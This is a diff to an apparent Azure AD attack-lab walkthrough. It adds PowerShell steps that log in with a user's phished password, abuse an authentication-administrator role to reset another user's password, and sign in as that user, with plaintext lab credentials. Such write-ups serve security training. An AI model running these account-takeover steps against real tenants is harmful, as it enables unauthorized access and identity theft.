@@ -930,5 +930,28 @@ We phish Roy using [Evilginx](https://github.com/conma293/Azure/blob/main/2.12_E
 [04:32:43] [+++] [0] Username: [roygcain@defcorphq.onmicrosoft.com]
 ```
 
-Now we can connect to target Tenant as Roy
+Now we can connect to target Tenant as Roy:
+```
+Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1
+$password = ConvertTo-SecureString 'Auth3nticatedPers0n@InDefHQtenant' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('roygcain@defcorphq.onmicrosoft.com', $password)
+Connect-AzureAD -Credential $creds
+```
+
+Because Roy has ```authentication administrator``` role scoped to the ```Control Unit``` administrative unit, and VMContributor213 users are member of the administrative unit, reset the password for VMContributor213@defcorphq.onmicrosoft.com:
+```
+$password = "VM@Contributor@123@321" | ConvertTo-SecureString -AsPlainText –Force
+(Get-AzureADUser -All $true | ?{$_.UserPrincipalName -eq "VMContributor213@defcorphq.onmicrosoft.com"}).ObjectId | Set-AzureADUserPassword -Password $Password –Verbose
+```
+
+Disconnect from Azure AD and connect using the credentials of the VMContributor213@defcorphq.onmicrosoft.com user:
+```
+Disconnect-AzureAD
+$password = ConvertTo-SecureString 'VM@Contributor@123@321' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential('VMContributor213@defcorphq.onmicrosoft.com', $password)
+Connect-AzAccount -Credential $creds
+```
+
+
+
 
